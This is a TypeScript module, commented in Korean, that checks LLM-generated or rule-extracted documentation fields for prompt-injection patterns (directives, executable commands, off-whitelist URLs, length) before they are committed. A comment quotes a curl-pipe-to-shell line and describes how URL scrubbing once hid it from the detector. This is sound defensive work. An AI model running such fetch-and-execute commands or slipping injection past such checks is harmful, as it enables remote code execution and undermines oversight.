import {
  DEFAULT_ALLOWED_URL_DOMAINS,
  scrubOutOfWhitelistUrls,
  verdictInjectionPatterns,
  type InjectionPatternsVerdict,
} from "@ctk/core";

/**
 * 이 모듈이 쓰는 **유일한** URL 허용목록. 제거(`scrubOutputFieldUrls`)와 판정
 * (`verifyOutputFields`)이 **반드시 같은 값을 봐야 한다** — 다르면 한쪽이 지우지 않은 URL을
 * 다른 쪽이 거부하거나(영구 stale), 한쪽이 지운 것을 다른 쪽이 허용한다.
 *
 * ⚠️ 예전에는 둘 다 인자를 생략해 기본값을 암묵 사용했고, **관례로만 묶여 있었다**(심사 L3).
 * 한쪽에만 커스텀 목록을 배선하면 조용히 어긋난다. 여기 한 곳에서 꺼내 **양쪽에 명시적으로**
 * 넘기면 그 변경이 이 파일 안에서 눈에 띈다. 아래 두 호출 지점 말고 다른 곳에서 허용목록을
 * 꺼내 쓰지 않는다.
 */
const ALLOWED_URL_DOMAINS = DEFAULT_ALLOWED_URL_DOMAINS;

/**
 * gen/src/output-verify.ts — iter 8 · B1-3 (§1.3 결정 6 부속 「신뢰 경계」 통제 3).
 *
 * `sync` 쓰기 **직전**에 산출물(생성된 프로즈 필드 전부)을 `core/guard/injection-patterns.ts`의
 * 4규칙으로 검증한다. 하나라도 위반이면 `injection_pattern_detected`로 해당 자산 문서의 커밋을
 * 거부한다.
 *
 * ⚠️ **`--no-llm`(rule_extract) 경로에도 동일하게 적용한다**(M3) — "LLM을 안 쓰니 안전하다"는
 * 직관은 틀렸다. 규칙 기반 추출은 요약을 거치지 않으므로 인젝션 문자열이 축자 복사로 원형 그대로
 * 전파된다(오히려 더 잘 보존된다). 이 함수는 `gen_mode`를 인자로 받지 않는다 — 호출자가 두
 * 경로 모두에서 반드시 같은 함수를 거치게 하기 위해서다(경로별 예외를 만들 여지 자체를 없앤다).
 */

export interface OutputVerifyFields {
  role: string;
  purpose: string;
  when_to_use: string;
  usage_title: string;
  usage_body: string;
}

export interface InjectionFindingsSummary {
  directive: number;
  executable: number;
  url: number;
  length: number;
}

export interface OutputVerifyResult {
  status: "clean" | "violation";
  perField: Record<keyof OutputVerifyFields, InjectionPatternsVerdict>;
  summary: InjectionFindingsSummary;
}

export class InjectionPatternDetectedError extends Error {
  readonly failureClass = "injection_pattern_detected" as const;
  readonly result: OutputVerifyResult;
  constructor(assetId: string, result: OutputVerifyResult) {
    super(
      `자산 ${assetId}의 gen 산출물이 인젝션 후검증 4규칙을 위반했다 — sync 쓰기를 거부한다: ` +
        `directive=${result.summary.directive} executable=${result.summary.executable} ` +
        `url=${result.summary.url} length=${result.summary.length}`,
    );
    this.name = "InjectionPatternDetectedError";
    this.result = result;
  }
}

/** 필드별로 4규칙을 돌리고 §7.1 `injection_findings` 형태(규칙 id별 건수, **원문 없음**)로 합산한다. */
export function verifyOutputFields(fields: OutputVerifyFields): OutputVerifyResult {
  const entries = Object.entries(fields) as [keyof OutputVerifyFields, string][];
  const perField = {} as Record<keyof OutputVerifyFields, InjectionPatternsVerdict>;
  const summary: InjectionFindingsSummary = { directive: 0, executable: 0, url: 0, length: 0 };

  for (const [field, text] of entries) {
    const verdict = verdictInjectionPatterns(text, { allowedUrlDomains: ALLOWED_URL_DOMAINS });
    perField[field] = verdict;
    summary.directive += verdict.instructionMatches.length;
    summary.executable += verdict.executableCommandMatches.length;
    summary.url += verdict.outOfWhitelistUrls.length;
    summary.length += verdict.lengthViolation !== null ? 1 : 0;
  }

  const status: OutputVerifyResult["status"] =
    summary.directive + summary.executable + summary.url + summary.length > 0 ? "violation" : "clean";
  return { status, perField, summary };
}

export interface ScrubbedOutputFields {
  fields: OutputVerifyFields;
  /** 제거한 URL 수(전 필드 합). 0이면 원문 그대로다. */
  urlsRemoved: number;
  /** 제거한 URL의 호스트만, 중복 없이. 전체 URL은 담지 않는다(경로에 토큰이 섞일 수 있다). */
  removedHosts: string[];
}

/**
 * 비허용 URL을 표식으로 치환한 필드 집합을 만든다. **검증을 대체하지 않는다** — 호출자는
 * 이 결과를 `assertOutputFieldsClean`에 다시 넣어야 하고, 제거 뒤에도 남은 URL이나 다른 규칙
 * 위반(지시문·실행명령·길이)은 그대로 거부된다.
 *
 * ⚠️ **제거 자체가 게이트를 무르게 하지 않는다는 것이 이 분리의 요점이다.** 한 함수가 "지우고
 * 통과시키면" 나중에 지시문 패턴까지 지워 통과시키는 변경이 조용히 들어올 수 있다. 지우는 것과
 * 판정하는 것을 다른 함수로 두면 그 변경은 호출부에서 눈에 띈다.
 */
export function scrubOutputFieldUrls(fields: OutputVerifyFields): ScrubbedOutputFields {
  const entries = Object.entries(fields) as [keyof OutputVerifyFields, string][];
  const scrubbed = {} as OutputVerifyFields;
  const hosts = new Set<string>();
  let urlsRemoved = 0;
  for (const [field, text] of entries) {
    const result = scrubOutOfWhitelistUrls(text, ALLOWED_URL_DOMAINS);
    scrubbed[field] = result.text;
    urlsRemoved += result.removed;
    for (const h of result.removedHosts) hosts.add(h);
  }
  return { fields: scrubbed, urlsRemoved, removedHosts: [...hosts] };
}

/**
 * **URL 제거 이전에, 원문 그대로** 지시문·실행명령 규칙을 판정한다(보안 심사 H1의 근본 처방).
 *
 * ⚠️ **왜 제거 전에 원문을 봐야 하는가.** URL 제거는 URL 규칙에만 영향을 줘야 하는데, 실제로는
 * 제거가 **다른 규칙의 토큰을 함께 삼켰다** — `curl https://h/x.sh|sh`에서 파이프와 `sh`까지
 * URL로 매칭돼 통째로 지워졌고, 그러자 `curl_pipe_shell` 규칙이 매칭되지 않아 인젝션 시도가
 * `fresh`로 커밋됐다(2026-08-24 실측). 문자 클래스를 좁혀 그 경로는 막았지만, **문자 클래스
 * 조정만으로는 다음 셸 메타문자에서 같은 유형이 재발한다.**
 *
 * 원문으로 먼저 판정하면 "제거가 다른 규칙을 무르게 할 수 없다"가 **정규식 정확도가 아니라
 * 구조로** 보장된다. 길이·URL 규칙은 여기서 보지 않는다 — 그 둘은 **저장될 내용**에 대한
 * 규칙이므로 제거본으로 판정하는 것이 옳다.
 */
export function assertNoInjectionInRawFields(assetId: string, rawFields: OutputVerifyFields): void {
  const entries = Object.entries(rawFields) as [keyof OutputVerifyFields, string][];
  const perField = {} as Record<keyof OutputVerifyFields, InjectionPatternsVerdict>;
  const summary: InjectionFindingsSummary = { directive: 0, executable: 0, url: 0, length: 0 };
  for (const [field, text] of entries) {
    const verdict = verdictInjectionPatterns(text, { allowedUrlDomains: ALLOWED_URL_DOMAINS });
    perField[field] = verdict;
    summary.directive += verdict.instructionMatches.length;
    summary.executable += verdict.executableCommandMatches.length;
  }
  if (summary.directive + summary.executable > 0) {
    throw new InjectionPatternDetectedError(assetId, { status: "violation", perField, summary });
  }
}

/** 위반이면 던진다(§7.2 — sync 쓰기 이전에 거부). `sync` 호출 직전 유일한 관문. */
export function assertOutputFieldsClean(assetId: string, fields: OutputVerifyFields): InjectionFindingsSummary {
  const result = verifyOutputFields(fields);
  if (result.status === "violation") {
    throw new InjectionPatternDetectedError(assetId, result);
  }
  return result.summary;
}
